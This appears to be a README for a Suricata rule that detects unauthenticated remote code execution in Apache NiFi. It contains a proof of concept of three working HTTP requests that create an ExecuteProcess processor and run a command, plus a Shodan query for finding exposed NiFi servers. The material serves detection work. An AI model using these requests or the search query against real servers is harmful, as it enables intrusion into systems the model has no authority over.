## Overview
A zero-day vulnerability (still does not have a CVE) in Apache Nifi. It looks like a backdoor because the API ExecuteProcess itself allows users to execute commands. The only problem is Apache Nifi does not enable authentication by default so attackers could access the abusable API to make a remote code execution.

Attackers have to take 3 steps to exploit an Apache Nifi server. First, they need the group id. Second, they make a process by using ExecuteProcess and get the process id. Finally, they insert the commands into the process's properties and get them executed.

In this Suricata rule, I try to capture the 3rd step of the exploit.

### Bonus for bug bounty hunters
Shodan search query for Apache Nifi:  
**http.title:"Nifi"**

## Proof of Concept
* 1st step: get the **group id**
```
GET /nifi-api/process-groups/root HTTP/1.1
Host: example.com:8080
```
* 2nd step: get the **process id**
```
POST /nifi-api/process-groups/12a18460-0172-1000-7305-3bc01519c125/processors HTTP/1.1
Host: example.com:8080
Content-Type: application/json
Content-Length: 105

{"component": {"type": "org.apache.nifi.processors.standard.ExecuteProcess"}, "revision": {"version": 0}}
```
* 3rd step: remote code execution
```
PUT /nifi-api/processors/65a2f415-0176-1000-9235-dc4c47a6417a HTTP/1.1
Host: example.com:8080
Content-Type: application/json
Content-Length: 326

{"component": {"config": {"autoTerminatedRelationships": ["success"], "properties": {"Command": "whoami", "Command Arguments": ""}, "schedulingPeriod": "3600 sec"}, "id": "65a2f415-0176-1000-9235-dc4c47a6417a", "state": "RUNNING"}, "revision": {"clientId": "x", "version": 1}}
```

## References
* https://github.com/imjdl/Apache-NiFi-Api-RCE
